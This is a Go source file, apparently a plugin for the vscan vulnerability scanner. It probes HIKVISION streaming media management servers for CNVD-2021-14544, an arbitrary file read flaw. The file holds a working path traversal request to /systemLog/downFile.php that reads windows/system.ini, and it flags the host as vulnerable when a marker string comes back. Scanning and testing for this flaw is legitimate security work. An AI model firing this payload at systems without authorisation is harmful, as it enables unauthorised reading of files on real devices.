package HIKVISION

import (
	"fmt"
	"github.com/veo/vscan/pkg"
	"strings"
)

//HIKVISION 流媒体管理服务器 后台任意文件读取漏洞

func CNVD_2021_14544(u string) bool {
	if req, err := pkg.HttpRequset(u+"/systemLog/downFile.php?fileName=../../../../../../../../../../../../../../../windows/system.ini", "GET", "", false, nil); err == nil {
		if req.StatusCode == 200 && strings.Contains(req.Body, "woafont") {
			pkg.GoPocLog(fmt.Sprintf("Found vuln HIKVISION 流媒体管理服务器 后台任意文件读取漏洞CNVD-2021-14544 |%s\n", u+"/systemLog/downFile.php?fileName=../../../../../../../../../../../../../../../windows/system.ini"))
			return true
		}
	}
	return false
}
